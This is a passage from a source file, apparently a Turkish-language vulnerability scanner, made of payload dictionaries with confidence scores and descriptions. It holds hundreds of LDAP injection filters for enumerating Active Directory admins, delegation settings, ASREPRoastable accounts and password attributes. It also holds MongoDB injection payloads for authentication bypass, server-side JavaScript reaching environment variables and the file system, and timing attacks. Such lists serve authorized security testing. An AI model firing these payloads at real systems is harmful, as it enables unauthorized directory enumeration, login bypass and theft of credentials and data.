    {"payload": "*)(|(|(|(dNSHostName=*.local)(dNSHostName=*.domain.*))(|(dNSHostName=*.com)(dNSHostName=*.org)))", "guven": 0.82, "aciklama": "Domain hostname patterns"},
    {"payload": "*))(|(|(|(ou=*Admin*)(ou=*Service*))(|(ou=*Users)(ou=*Computers)))", "guven": 0.81, "aciklama": "Organizational unit patterns"},
    {"payload": "*)(|(|(|(cn=*DC*)(cn=*SERVER*))(|(cn=*WS*)(cn=*CLIENT*)))", "guven": 0.83, "aciklama": "Computer naming patterns"},
    {"payload": "*))(|(|(|(instanceType=4)(instanceType=0))(|(instanceType=1)(instanceType=2)))", "guven": 0.80, "aciklama": "Instance type enumeration"},
    {"payload": "*)(|(|(|(objectCategory=person)(objectCategory=computer))(|(objectCategory=group)(objectCategory=organizationalUnit)))", "guven": 0.82, "aciklama": "Object category enumeration"},
    {"payload": "*))(|(|(|(systemFlags=*)(isCriticalSystemObject=TRUE))(|(showInAdvancedViewOnly=TRUE)(isDeleted=TRUE)))", "guven": 0.83, "aciklama": "System and special objects"},
    {"payload": "*)(|(|(|(whenCreated>=20240101*)(whenChanged>=20240101*))(|(uSNCreated>=1000000)(uSNChanged>=1000000)))", "guven": 0.84, "aciklama": "Recent activity indicators"},
    {"payload": "*))(|(|(|(createTimeStamp>=20240101*)(modifyTimeStamp>=20240101*))(|(dSCorePropagationData>=20240101*)(replPropertyMetaData>=*)))", "guven": 0.83, "aciklama": "Timestamp based enumeration"},
    {"payload": "*)(|(|(|(nTSecurityDescriptor=*)(defaultSecurityDescriptor=*))(|(objectGUID=*)(objectSid=*)))", "guven": 0.82, "aciklama": "Security and identifier attributes"},
    {"payload": "*))(|(|(|(canonicalName=*)(distinguishedName=*))(|(name=*)(displayName=*)))", "guven": 0.79, "aciklama": "Name attribute enumeration"},
    {"payload": "*)(|(|(|(comment=*)(description=*))(|(info=*)(notes=*)))", "guven": 0.76, "aciklama": "Comment field enumeration"},
    {"payload": "*))(|(|(|(url=*)(wWWHomePage=*))(|(personalTitle=*)(businessCategory=*)))", "guven": 0.75, "aciklama": "Web and business attributes"},
    {"payload": "*)(|(|(|(manager=*)(directReports=*))(|(assistant=*)(secretary=*)))", "guven": 0.81, "aciklama": "Organizational hierarchy"},
    {"payload": "*))(|(|(|(employeeID=*)(employeeNumber=*))(|(employeeType=*)(organizationalStatus=*)))", "guven": 0.78, "aciklama": "Employee identification"},
    {"payload": "*)(|(|(|(costCenter=*)(company=*))(|(division=*)(department=*)))", "guven": 0.77, "aciklama": "Corporate structure enumeration"},
    {"payload": "*))(|(|(|(postalAddress=*)(streetAddress=*))(|(l=*)(st=*)))", "guven": 0.76, "aciklama": "Geographic address information"},
    {"payload": "*)(|(|(|(postOfficeBox=*)(postalCode=*))(|(physicalDeliveryOfficeName=*)(roomNumber=*)))", "guven": 0.75, "aciklama": "Physical location details"},
    {"payload": "*))(|(|(|(preferredDeliveryMethod=*)(registeredAddress=*))(|(destinationIndicator=*)(internationaliSDNNumber=*)))", "guven": 0.74, "aciklama": "Communication preferences"},
    {"payload": "*)(|(|(|(audio=*)(jpegPhoto=*))(|(thumbnailPhoto=*)(userSMIMECertificate=*)))", "guven": 0.73, "aciklama": "Multimedia attribute enumeration"},
    {"payload": "*))(|(|(|(searchGuide=*)(seeAlso=*))(|(labeledURI=*)(carLicense=*)))", "guven": 0.72, "aciklama": "Reference and misc attributes"},
    {"payload": "*)(|(|(|(x121Address=*)(telexNumber=*))(|(teletexTerminalIdentifier=*)(facsimileTelephoneNumber=*)))", "guven": 0.71, "aciklama": "Legacy communication methods"},
    {"payload": "*))(|(|(|(businessRole=*)(departmentNumber=*))(|(personalSignature=*)(userClass=*)))", "guven": 0.74, "aciklama": "Business and personal attributes"},
    {"payload": "*)(|(|(|(associatedDomain=*)(associatedName=*))(|(homePostalAddress=*)(janetMailbox=*)))", "guven": 0.75, "aciklama": "Association and legacy mail"},
    {"payload": "*))(|(|(|(rfc822Mailbox=*)(textEncodedORAddress=*))(|(dmdName=*)(knowledgeInformation=*)))", "guven": 0.76, "aciklama": "Mail systems and directory info"},
    {"payload": "*)(|(|(|(drink=*)(personalSignature=*))(|(userPassword=*)(authPassword=*)))", "guven": 0.88, "aciklama": "Personal and authentication attrs"},
    {"payload": "*))(|(|(|(host=*)(ipServicePort=*))(|(ipServiceProtocol=*)(ipProtocolNumber=*)))", "guven": 0.79, "aciklama": "Network service attributes"},
    {"payload": "*)(|(|(|(oncRpcNumber=*)(ipNetworkNumber=*))(|(ipNetmaskNumber=*)(macAddress=*)))", "guven": 0.78, "aciklama": "Network configuration attributes"},
    {"payload": "*))(|(|(|(bootFile=*)(bootParameter=*))(|(nisMapName=*)(nisMapEntry=*)))", "guven": 0.77, "aciklama": "Boot and NIS attributes"},
    {"payload": "*)(|(|(|(shadowLastChange=*)(shadowMin=*))(|(shadowMax=*)(shadowWarning=*)))", "guven": 0.86, "aciklama": "Shadow password attributes"},
    {"payload": "*))(|(|(|(shadowInactive=*)(shadowExpire=*))(|(shadowFlag=*)(memberUid=*)))", "guven": 0.85, "aciklama": "Shadow expiry and membership"},
    {"payload": "*)(|(|(|(loginShell=*)(homeDirectory=*))(|(gecos=*)(gidNumber=*)))", "guven": 0.84, "aciklama": "POSIX user attributes"},
    {"payload": "*))(|(|(|(uidNumber=*)(memberUid=*))(|(cn=*)(gidNumber=*)))", "guven": 0.83, "aciklama": "POSIX group and user IDs"},
    {"payload": "*)(|(|(|(nisNetgroupTriple=*)(memberNisNetgroup=*))(|(automountKey=*)(automountInformation=*)))", "guven": 0.80, "aciklama": "NIS netgroup and automount"},

    # Final Advanced Patterns (451-500)
    {"payload": "*))(|(&(&(&(objectClass=user)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))(adminCount=1))(memberOf=*admin*))", "guven": 0.96, "aciklama": "Triple nested active admin in admin group"},
    {"payload": "*)(|(&(&(&(objectClass=user)(servicePrincipalName=*))(!(userAccountControl:1.2.840.113556.1.4.803:=2)))(trustedForDelegation=TRUE))", "guven": 0.97, "aciklama": "Active trusted delegation service account"},
    {"payload": "*))(|(&(&(&(objectClass=user)(dontRequirePreauth=TRUE))(!(userAccountControl:1.2.840.113556.1.4.803:=2)))(servicePrincipalName=*))", "guven": 0.98, "aciklama": "ASREPRoast vulnerable service account"},
    {"payload": "*)(|(&(&(&(objectClass=user)(msDS-AllowedToActOnBehalfOfOtherIdentity=*))(!(userAccountControl:1.2.840.113556.1.4.803:=2)))(adminCount=1))", "guven": 0.99, "aciklama": "Resource-based constrained delegation admin"},
    {"payload": "*))(|(&(&(&(objectClass=computer)(userAccountControl=4096))(servicePrincipalName=*))(operatingSystem=*Server*))", "guven": 0.91, "aciklama": "Server computer with SPNs"},
    {"payload": "*)(|(&(&(&(objectClass=user)(pwdLastSet=0))(!(userAccountControl:1.2.840.113556.1.4.803:=2)))(whenCreated>=*))", "guven": 0.94, "aciklama": "Recent active user no password set"},
    {"payload": "*))(|(&(&(&(objectClass=user)(badPwdCount>=1))(lockoutTime=0))(lastLogon>=*))", "guven": 0.89, "aciklama": "Recent failed auth not locked"},
    {"payload": "*)(|(&(&(&(objectClass=user)(accountExpires=0))(passwordNeverExpires=TRUE))(adminCount=1))", "guven": 0.93, "aciklama": "Never expiring admin account"},
    {"payload": "*))(|(&(&(&(objectClass=user)(logonCount=0))(whenCreated>=*))(!(userAccountControl:1.2.840.113556.1.4.803:=2)))", "guven": 0.88, "aciklama": "New active user never logged in"},
    {"payload": "*)(|(&(&(&(objectClass=user)(sidHistory=*))(adminCount=1))(primaryGroupID=512))", "guven": 0.95, "aciklama": "Domain admin with SID history"},
    {"payload": "*))(|(&(&(&(objectClass=group)(groupType=-2147483646))(member=*))(cn=*admin*))", "guven": 0.92, "aciklama": "Admin security group with members"},
    {"payload": "*)(|(&(&(&(objectClass=user)(userCertificate=*))(!(userAccountControl:1.2.840.113556.1.4.803:=2)))(adminCount=1))", "guven": 0.90, "aciklama": "Active admin with certificates"},
    {"payload": "*))(|(&(&(&(objectClass=user)(homeDirectory=*))(profilePath=*))(scriptPath=*))", "guven": 0.85, "aciklama": "User with complete profile setup"},
    {"payload": "*)(|(&(&(&(objectClass=user)(proxyAddresses=*))(mail=*))(msExchMailboxGuid=*))", "guven": 0.84, "aciklama": "Exchange user with proxy addresses"},
    {"payload": "*))(|(&(&(&(objectClass=user)(telephoneNumber=*))(mobile=*))(department=*))", "guven": 0.80, "aciklama": "Complete contact info user"},
    {"payload": "*)(|(&(&(&(objectClass=user)(manager=*))(directReports=*))(employeeID=*))", "guven": 0.83, "aciklama": "Manager with direct reports"},
    {"payload": "*))(|(&(&(&(objectClass=user)(extensionAttribute1=*))(extensionAttribute5=*))(info=*admin*))", "guven": 0.87, "aciklama": "Admin with extension attributes"},
    {"payload": "*)(|(&(&(&(objectClass=computer)(operatingSystem=*Server*))(servicePrincipalName=*))(!(userAccountControl:1.2.840.113556.1.4.803:=2)))", "guven": 0.90, "aciklama": "Active server with services"},
    {"payload": "*))(|(&(&(&(objectClass=computer)(dNSHostName=*))(servicePrincipalName=*))(lastLogon>=*))", "guven": 0.88, "aciklama": "Recently active computer with DNS"},
    {"payload": "*)(|(&(&(&(objectClass=organizationalUnit)(ou=*))(whenCreated>=*))(!(isDeleted=TRUE)))", "guven": 0.82, "aciklama": "Recent active organizational units"},
    {"payload": "*))(|(&(&(&(objectClass=contact)(mail=*))(!(objectClass=user)))(telephoneNumber=*))", "guven": 0.81, "aciklama": "Contact with complete info"},
    {"payload": "*)(|(&(&(&(cn=*admin*)(objectClass=user))(memberOf=*))(!(userAccountControl:1.2.840.113556.1.4.803:=2)))", "guven": 0.93, "aciklama": "Active admin user in groups"},
    {"payload": "*))(|(&(&(&(sAMAccountName=*admin*)(objectClass=user))(servicePrincipalName=*))(adminCount=1))", "guven": 0.94, "aciklama": "Admin service account"},
    {"payload": "*)(|(&(&(&(userPrincipalName=*admin*@*)(objectClass=user))(lastLogon>=*))(!(userAccountControl:1.2.840.113556.1.4.803:=2)))", "guven": 0.92, "aciklama": "Recently active admin UPN"},
    {"payload": "*))(|(&(&(&(displayName=*admin*)(objectClass=user))(pwdLastSet>=*))(adminCount=1))", "guven": 0.91, "aciklama": "Admin with recent password change"},
    {"payload": "*)(|(&(&(&(mail=*admin*@*)(objectClass=user))(proxyAddresses=*))(msExchMailboxGuid=*))", "guven": 0.89, "aciklama": "Admin Exchange mailbox"},
    {"payload": "*))(|(&(&(&(description=*admin*)(objectClass=user))(department=*))(title=*))", "guven": 0.86, "aciklama": "Admin user with job details"},
    {"payload": "*)(|(&(&(&(servicePrincipalName=*SQL*)(objectClass=user))(!(userAccountControl:1.2.840.113556.1.4.803:=2)))(trustedForDelegation=TRUE))", "guven": 0.96, "aciklama": "SQL service with delegation"},
    {"payload": "*))(|(&(&(&(servicePrincipalName=*HTTP*)(objectClass=user))(msDS-AllowedToActOnBehalfOfOtherIdentity=*))(!(userAccountControl:1.2.840.113556.1.4.803:=2)))", "guven": 0.95, "aciklama": "HTTP service with RBCD"},
    {"payload": "*)(|(&(&(&(servicePrincipalName=*CIFS*)(objectClass=user))(dontRequirePreauth=TRUE))(!(userAccountControl:1.2.840.113556.1.4.803:=2)))", "guven": 0.97, "aciklama": "CIFS service ASREPRoastable"},
    {"payload": "*))(|(&(&(&(servicePrincipalName=*HOST*)(objectClass=user))(pwdLastSet<=*))(!(userAccountControl:1.2.840.113556.1.4.803:=2)))", "guven": 0.90, "aciklama": "HOST service old password"},
    {"payload": "*)(|(&(&(&(servicePrincipalName=*LDAP*)(objectClass=user))(adminCount=1))(!(userAccountControl:1.2.840.113556.1.4.803:=2)))", "guven": 0.94, "aciklama": "LDAP admin service account"},
    {"payload": "*))(|(&(&(&(servicePrincipalName=*TERMSRV*)(objectClass=user))(lastLogon>=*))(!(userAccountControl:1.2.840.113556.1.4.803:=2)))", "guven": 0.88, "aciklama": "Active Terminal Services account"},
    {"payload": "*)(|(&(&(&(primaryGroupID=512)(objectClass=user))(adminCount=1))(!(userAccountControl:1.2.840.113556.1.4.803:=2)))", "guven": 0.95, "aciklama": "Domain admin primary group"},
    {"payload": "*))(|(&(&(&(primaryGroupID=513)(objectClass=user))(memberOf=*admin*))(adminCount=1))", "guven": 0.93, "aciklama": "Domain user in admin groups"},
    {"payload": "*)(|(&(&(&(primaryGroupID=515)(objectClass=computer))(servicePrincipalName=*))(operatingSystem=*Server*))", "guven": 0.89, "aciklama": "Domain computer server with SPN"},
    {"payload": "*))(|(&(&(&(groupType=-2147483646)(objectClass=group))(member=*))(cn=*Domain Admins*))", "guven": 0.96, "aciklama": "Domain Admins security group"},
    {"payload": "*)(|(&(&(&(groupType=-2147483646)(objectClass=group))(member=*))(cn=*Enterprise Admins*))", "guven": 0.97, "aciklama": "Enterprise Admins security group"},
    {"payload": "*))(|(&(&(&(groupType=-2147483646)(objectClass=group))(member=*))(cn=*Schema Admins*))", "guven": 0.98, "aciklama": "Schema Admins security group"},
    {"payload": "*)(|(&(&(&(groupType=-2147483646)(objectClass=group))(member=*))(cn=*Administrators*))", "guven": 0.94, "aciklama": "Local Administrators group"},
    {"payload": "*))(|(&(&(&(groupType=-2147483646)(objectClass=group))(member=*))(cn=*Account Operators*))", "guven": 0.91, "aciklama": "Account Operators group"},
    {"payload": "*)(|(&(&(&(groupType=-2147483646)(objectClass=group))(member=*))(cn=*Server Operators*))", "guven": 0.90, "aciklama": "Server Operators group"},
    {"payload": "*))(|(&(&(&(groupType=-2147483646)(objectClass=group))(member=*))(cn=*Backup Operators*))", "guven": 0.89, "aciklama": "Backup Operators group"},
    {"payload": "*)(|(&(&(&(groupType=-2147483646)(objectClass=group))(member=*))(cn=*Print Operators*))", "guven": 0.87, "aciklama": "Print Operators group"},
    {"payload": "*))(|(&(&(&(operatingSystem=*Windows*)(objectClass=computer))(servicePrincipalName=*))(!(userAccountControl:1.2.840.113556.1.4.803:=2)))", "guven": 0.86, "aciklama": "Active Windows computer with SPN"},
    {"payload": "*)(|(&(&(&(operatingSystem=*Server*)(objectClass=computer))(lastLogon>=*))(dNSHostName=*))", "guven": 0.88, "aciklama": "Recent server with hostname"},
    {"payload": "*))(|(&(&(&(operatingSystem=*Domain Controller*)(objectClass=computer))(servicePrincipalName=*))(!(userAccountControl:1.2.840.113556.1.4.803:=2)))", "guven": 0.95, "aciklama": "Active domain controller"},
    {"payload": "*)(|(&(&(&(userAccountControl=66048)(objectClass=user))(passwordNeverExpires=TRUE))(adminCount=1))", "guven": 0.92, "aciklama": "Never expire password admin"},
    {"payload": "*))(|(&(&(&(userAccountControl=590336)(objectClass=user))(trustedForDelegation=TRUE))(servicePrincipalName=*))", "guven": 0.96, "aciklama": "Trusted delegation service"},
    {"payload": "*)(|(&(&(&(userAccountControl=4194816)(objectClass=user))(dontRequirePreauth=TRUE))(!(userAccountControl:1.2.840.113556.1.4.803:=2)))", "guven": 0.98, "aciklama": "No preauth + no expire password"},
    {"payload": "*))(|(&(&(&(msDS-SupportedEncryptionTypes=*)(objectClass=user))(servicePrincipalName=*))(!(userAccountControl:1.2.840.113556.1.4.803:=2)))", "guven": 0.90, "aciklama": "Encryption enabled service account"},
    {"payload": "*)(|(&(&(&(msDS-KeyVersionNumber=*)(objectClass=user))(userPrincipalName=*))(lastLogon>=*))", "guven": 0.87, "aciklama": "Kerberos key with recent logon"},
    {"payload": "*))(|(&(&(&(pwdProperties=*)(objectClass=user))(msDS-ResultantPSO=*))(adminCount=1))", "guven": 0.88, "aciklama": "Admin with password policy"},
    {"payload": "*)(|(&(&(&(msDS-AuthenticatedAtDC=*)(objectClass=user))(lastLogon>=*))(!(userAccountControl:1.2.840.113556.1.4.803:=2)))", "guven": 0.85, "aciklama": "Recent DC authenticated user"},
    {"payload": "*))(|(&(&(&(nTSecurityDescriptor=*)(objectClass=user))(adminCount=1))(objectSid=*))", "guven": 0.93, "aciklama": "Admin with security descriptor"},
    {"payload": "*)(|(&(&(&(objectGUID=*)(objectClass=user))(distinguishedName=*))(canonicalName=*))", "guven": 0.82, "aciklama": "User with complete identifiers"},
    {"payload": "*))(|(&(&(&(whenCreated>=20240101*)(objectClass=user))(whenChanged>=20240601*))(!(userAccountControl:1.2.840.113556.1.4.803:=2)))", "guven": 0.86, "aciklama": "2024 created recently changed user"},
    {"payload": "*)(|(&(&(&(uSNCreated>=1000000)(objectClass=user))(uSNChanged>=1500000))(adminCount=1))", "guven": 0.89, "aciklama": "High USN admin account"},
    {"payload": "*))(|(&(&(&(instanceType=4)(objectClass=user))(objectCategory=person))(!(isDeleted=TRUE)))", "guven": 0.84, "aciklama": "Standard person instance"},
    {"payload": "*)(|(&(&(&(systemFlags=*)(objectClass=*))(isCriticalSystemObject=TRUE))(!(isDeleted=TRUE)))", "guven": 0.87, "aciklama": "Critical system objects"},
    {"payload": "*))(|(&(&(&(showInAdvancedViewOnly=TRUE)(objectClass=*))(!(isDeleted=TRUE)))(nTSecurityDescriptor=*))", "guven": 0.83, "aciklama": "Advanced view objects with security"},
    {"payload": "*)(|(&(&(&(replPropertyMetaData=*)(objectClass=*))(dSCorePropagationData>=20240101*))(!(isDeleted=TRUE)))", "guven": 0.81, "aciklama": "Objects with 2024 replication data"},
    {"payload": "*))(|(&(&(&(msDS-RevealedDSAs=*)(objectClass=*))(msDS-RevealedUsers=*))(!(isDeleted=TRUE)))", "guven": 0.82, "aciklama": "RODC revealed objects"},
    {"payload": "*)(|(&(&(&(msDS-AllowedToActOnBehalfOfOtherIdentity=*)(objectClass=user))(msDS-GroupMSAMembership=*))(!(userAccountControl:1.2.840.113556.1.4.803:=2)))", "guven": 0.93, "aciklama": "RBCD with MSA membership"},
    {"payload": "*))(|(&(&(&(comment=*)(objectClass=user))(description=*))(info=*))", "guven": 0.78, "aciklama": "User with all comment fields"},
    {"payload": "*)(|(&(&(&(url=*)(objectClass=user))(wWWHomePage=*))(personalTitle=*))", "guven": 0.77, "aciklama": "User with web presence"},
    {"payload": "*))(|(&(&(&(assistant=*)(objectClass=user))(secretary=*))(manager=*))", "guven": 0.82, "aciklama": "User with complete org hierarchy"},
    {"payload": "*)(|(&(&(&(homePhone=*)(objectClass=user))(telephoneNumber=*))(mobile=*))", "guven": 0.79, "aciklama": "User with all phone numbers"},
    {"payload": "*))(|(&(&(&(postalAddress=*)(objectClass=user))(streetAddress=*))(l=*))", "guven": 0.78, "aciklama": "User with complete address"},
    {"payload": "*)(|(&(&(&(carLicense=*)(objectClass=user))(roomNumber=*))(physicalDeliveryOfficeName=*))", "guven": 0.76, "aciklama": "User with physical identifiers"},
    {"payload": "*))(|(&(&(&(preferredLanguage=*)(objectClass=user))(countryCode=*))(c=*))", "guven": 0.75, "aciklama": "User with locale information"},
    {"payload": "*)(|(&(&(&(employeeID=*)(objectClass=user))(employeeNumber=*))(employeeType=*))", "guven": 0.80, "aciklama": "User with complete employee info"},
    {"payload": "*))(|(&(&(&(costCenter=*)(objectClass=user))(company=*))(division=*))", "guven": 0.79, "aciklama": "User with corporate structure"},
    {"payload": "*)(|(&(&(&(businessRole=*)(objectClass=user))(departmentNumber=*))(organizationalStatus=*))", "guven": 0.78, "aciklama": "User with business classification"},
    {"payload": "*))(|(&(&(&(preferredDeliveryMethod=*)(objectClass=user))(registeredAddress=*))(destinationIndicator=*))", "guven": 0.74, "aciklama": "User with delivery preferences"},
    {"payload": "*)(|(&(&(&(audio=*)(objectClass=user))(jpegPhoto=*))(thumbnailPhoto=*))", "guven": 0.73, "aciklama": "User with multimedia content"},
    {"payload": "*))(|(&(&(&(searchGuide=*)(objectClass=user))(seeAlso=*))(labeledURI=*))", "guven": 0.72, "aciklama": "User with reference attributes"},
    {"payload": "*)(|(&(&(&(x121Address=*)(objectClass=user))(telexNumber=*))(facsimileTelephoneNumber=*))", "guven": 0.71, "aciklama": "User with legacy communication"},
    {"payload": "*))(|(&(&(&(drink=*)(objectClass=user))(personalSignature=*))(userClass=*))", "guven": 0.70, "aciklama": "User with personal attributes"},
    {"payload": "*)(|(&(&(&(host=*)(objectClass=user))(homeDirectory=*))(loginShell=*))", "guven": 0.83, "aciklama": "POSIX user account"},
    {"payload": "*))(|(&(&(&(uidNumber=*)(objectClass=user))(gidNumber=*))(gecos=*))", "guven": 0.84, "aciklama": "Complete POSIX user"},
    {"payload": "*)(|(&(&(&(shadowLastChange=*)(objectClass=user))(shadowMax=*))(shadowWarning=*))", "guven": 0.86, "aciklama": "Shadow password user"},
    {"payload": "*))(|(&(&(&(memberUid=*)(objectClass=group))(gidNumber=*))(cn=*))", "guven": 0.82, "aciklama": "POSIX group with members"},
    {"payload": "*)(|(&(&(&(nisNetgroupTriple=*)(objectclass=nisNetgroup))(memberNisNetgroup=*))(cn=*))", "guven": 0.80, "aciklama": "NIS netgroup complete"},
    {"payload": "*))(|(&(&(&(automountKey=*)(objectClass=automount))(automountInformation=*))(cn=*))", "guven": 0.79, "aciklama": "Automount entry complete"}
],
            
            ZafiyetTipi.NOSQL: [
    # MongoDB Temel Bypass Teknikleri (1-50)
    {"payload": "'; return true; var dummy='", "guven": 0.9, "aciklama": "JavaScript NoSQL bypass"},
    {"payload": "' || '1'=='1", "guven": 0.85, "aciklama": "OR koşulu NoSQL"},
    {"payload": "{\"$gt\": \"\"}", "guven": 0.8, "aciklama": "MongoDB greater than"},
    {"payload": "{\"$ne\": null}", "guven": 0.8, "aciklama": "MongoDB not equal"},
    {"payload": "{\"$exists\": true}", "guven": 0.8, "aciklama": "MongoDB exists operatörü"},
    {"payload": "{\"$regex\": \".*\"}", "guven": 0.85, "aciklama": "MongoDB regex wildcard"},
    {"payload": "'; return db.version(); var dummy='", "guven": 0.9, "aciklama": "Database version NoSQL"},
    {"payload": "{\"$where\": \"this.username == this.password\"}", "guven": 0.9, "aciklama": "MongoDB where clause"},
    {"payload": "{\"$or\": [{\"username\": \"admin\"}, {\"username\": \"administrator\"}]}", "guven": 0.85, "aciklama": "MongoDB OR operatörü"},
    {"payload": "{\"$and\": [{\"$gt\": \"\"}, {\"$lt\": \"zzz\"}]}", "guven": 0.8, "aciklama": "MongoDB AND operatörü"},
    
    # JavaScript Context Injections (51-100)
    {"payload": "'; return this.username.match(/^admin/); var x='", "guven": 0.9, "aciklama": "Regex match bypass"},
    {"payload": "'; return Object.keys(this).length > 0; var x='", "guven": 0.85, "aciklama": "Object enumeration"},
    {"payload": "'; return this.password.charAt(0) == 'a'; var x='", "guven": 0.88, "aciklama": "Character-by-character extraction"},
    {"payload": "'; return this.role == 'admin' || this.role == 'root'; var x='", "guven": 0.9, "aciklama": "Multi-role bypass"},
    {"payload": "'; return typeof this.password !== 'undefined'; var x='", "guven": 0.8, "aciklama": "Type checking bypass"},
    {"payload": "'; return this.constructor.constructor('return process')().env; var x='", "guven": 0.95, "aciklama": "Environment variable access"},
    {"payload": "'; return global.process.mainModule.require('fs'); var x='", "guven": 0.95, "aciklama": "File system access"},
    {"payload": "'; var x = this; return x.hasOwnProperty('admin'); var y='", "guven": 0.85, "aciklama": "Property existence check"},
    {"payload": "'; return JSON.stringify(this).indexOf('admin') > -1; var x='", "guven": 0.88, "aciklama": "JSON serialization search"},
    {"payload": "'; return this.toString().includes('password'); var x='", "guven": 0.8, "aciklama": "String conversion search"},
    
    # MongoDB Operator Exploits (101-150)
    {"payload": "{\"$expr\": {\"$eq\": [\"$password\", \"$username\"]}}", "guven": 0.9, "aciklama": "Expression operator exploit"},
    {"payload": "{\"$jsonSchema\": {\"required\": []}}", "guven": 0.75, "aciklama": "JSON schema bypass"},
    {"payload": "{\"$comment\": \"injection\", \"$gt\": \"\"}", "guven": 0.8, "aciklama": "Comment field injection"},
    {"payload": "{\"$mod\": [1, 0]}", "guven": 0.85, "aciklama": "Modulo operation bypass"},
    {"payload": "{\"$size\": {\"$gte\": 0}}", "guven": 0.8, "aciklama": "Array size operator"},
    {"payload": "{\"$type\": \"string\"}", "guven": 0.8, "aciklama": "Type operator bypass"},
    {"payload": "{\"$all\": []}", "guven": 0.75, "aciklama": "All operator with empty array"},
    {"payload": "{\"$elemMatch\": {\"$exists\": true}}", "guven": 0.8, "aciklama": "Element match bypass"},
    {"payload": "{\"$slice\": [0, 1]}", "guven": 0.7, "aciklama": "Array slice operator"},
    {"payload": "{\"$push\": {\"$each\": []}}", "guven": 0.7, "aciklama": "Push operator injection"},
    
    # Advanced Where Clause Exploits (151-200)
    {"payload": "{\"$where\": \"function() { return true; }\"}", "guven": 0.9, "aciklama": "Function-based where clause"},
    {"payload": "{\"$where\": \"this.username.length > 0\"}", "guven": 0.85, "aciklama": "Length-based where clause"},
    {"payload": "{\"$where\": \"sleep(5000) || true\"}", "guven": 0.9, "aciklama": "Time-based injection"},
    {"payload": "{\"$where\": \"Math.random() > 0\"}", "guven": 0.8, "aciklama": "Random-based bypass"},
    {"payload": "{\"$where\": \"Date.now() > 0\"}", "guven": 0.8, "aciklama": "Date-based bypass"},
    {"payload": "{\"$where\": \"Object.keys(this).indexOf('password') > -1\"}", "guven": 0.88, "aciklama": "Key enumeration"},
    {"payload": "{\"$where\": \"this.constructor.name == 'Object'\"}", "guven": 0.85, "aciklama": "Constructor name check"},
    {"payload": "{\"$where\": \"typeof this.admin !== 'undefined'\"}", "guven": 0.85, "aciklama": "Admin field existence"},
    {"payload": "{\"$where\": \"this.valueOf().toString().length > 0\"}", "guven": 0.8, "aciklama": "Value conversion check"},
    {"payload": "{\"$where\": \"JSON.parse(JSON.stringify(this)).username\"}", "guven": 0.85, "aciklama": "JSON round-trip"},
    
    # Regex-based Injections (201-250)
    {"payload": "{\"username\": {\"$regex\": \"^admin\", \"$options\": \"i\"}}", "guven": 0.85, "aciklama": "Case-insensitive regex"},
    {"payload": "{\"password\": {\"$regex\": \".*\", \"$options\": \"s\"}}", "guven": 0.9, "aciklama": "Dot-all regex flag"},
    {"payload": "{\"email\": {\"$regex\": \"^(?!.*@.*@).*@.*\\\\..+$\"}}", "guven": 0.8, "aciklama": "Complex email regex"},
    {"payload": "{\"username\": {\"$regex\": \"(admin|root|superuser)\"}}", "guven": 0.88, "aciklama": "Multiple username patterns"},
    {"payload": "{\"$or\": [{\"username\": {\"$regex\": \"admin\"}}, {\"role\": \"admin\"}]}", "guven": 0.9, "aciklama": "Combined regex OR"},
    {"payload": "{\"password\": {\"$regex\": \"^.{0,}$\", \"$options\": \"m\"}}", "guven": 0.85, "aciklama": "Multiline regex bypass"},
    {"payload": "{\"token\": {\"$regex\": \"[a-zA-Z0-9]{32,}\"}}", "guven": 0.8, "aciklama": "Token pattern matching"},
    {"payload": "{\"$where\": \"this.username.match(/admin|root/)\"}", "guven": 0.88, "aciklama": "JavaScript regex in where"},
    {"payload": "{\"data\": {\"$regex\": \"(?=.*admin)(?=.*password)\"}}", "guven": 0.85, "aciklama": "Positive lookahead regex"},
    {"payload": "{\"field\": {\"$regex\": \"^(?!test).*\"}}", "guven": 0.8, "aciklama": "Negative lookahead regex"},
    
    # Aggregation Pipeline Exploits (251-300)
    {"payload": "[{\"$match\": {\"$expr\": {\"$gt\": [\"$admin\", 0]}}}]", "guven": 0.9, "aciklama": "Aggregation match expression"},
    {"payload": "[{\"$project\": {\"password\": 1, \"_id\": 0}}]", "guven": 0.85, "aciklama": "Password field projection"},
    {"payload": "[{\"$group\": {\"_id\": \"$role\", \"count\": {\"$sum\": 1}}}]", "guven": 0.8, "aciklama": "Role enumeration grouping"},
    {"payload": "[{\"$lookup\": {\"from\": \"users\", \"localField\": \"_id\", \"foreignField\": \"userId\", \"as\": \"userData\"}}]", "guven": 0.9, "aciklama": "Collection lookup"},
    {"payload": "[{\"$unwind\": \"$permissions\"}, {\"$match\": {\"permissions\": \"admin\"}}]", "guven": 0.88, "aciklama": "Array unwinding for permissions"},
    {"payload": "[{\"$addFields\": {\"isAdmin\": {\"$eq\": [\"$role\", \"admin\"]}}}]", "guven": 0.85, "aciklama": "Dynamic field addition"},
    {"payload": "[{\"$sort\": {\"createdAt\": -1}}, {\"$limit\": 1}]", "guven": 0.8, "aciklama": "Latest record extraction"},
    {"payload": "[{\"$sample\": {\"size\": 100}}]", "guven": 0.75, "aciklama": "Random document sampling"},
    {"payload": "[{\"$facet\": {\"users\": [{\"$match\": {\"role\": \"admin\"}}], \"total\": [{\"$count\": \"count\"}]}}]", "guven": 0.9, "aciklama": "Multi-pipeline faceting"},
    {"payload": "[{\"$graphLookup\": {\"from\": \"users\", \"startWith\": \"$_id\", \"connectFromField\": \"_id\", \"connectToField\": \"parentId\", \"as\": \"hierarchy\"}}]", "guven": 0.9, "aciklama": "Graph traversal lookup"},
    
    # NoSQL Database Fingerprinting (301-350)
    {"payload": "'; return db.runCommand('buildInfo'); var x='", "guven": 0.9, "aciklama": "MongoDB build information"},
    {"payload": "'; return db.serverStatus(); var x='", "guven": 0.9, "aciklama": "Server status enumeration"},
    {"payload": "'; return db.adminCommand('listCollections'); var x='", "guven": 0.95, "aciklama": "Collection enumeration"},
    {"payload": "'; return db.stats(); var x='", "guven": 0.85, "aciklama": "Database statistics"},
    {"payload": "'; return db.hostInfo(); var x='", "guven": 0.9, "aciklama": "Host information disclosure"},
    {"payload": "{\"$where\": \"version() > '4.0'\"}", "guven": 0.8, "aciklama": "Version-based condition"},
    {"payload": "'; return Object.getOwnPropertyNames(db); var x='", "guven": 0.9, "aciklama": "Database property enumeration"},
    {"payload": "'; return db.getMongo().getDBNames(); var x='", "guven": 0.95, "aciklama": "Database name enumeration"},
    {"payload": "'; return rs.status(); var x='", "guven": 0.9, "aciklama": "Replica set status"},
    {"payload": "'; return sh.status(); var x='", "guven": 0.9, "aciklama": "Sharding status"},
    
    # Time-based Blind Injections (351-400)
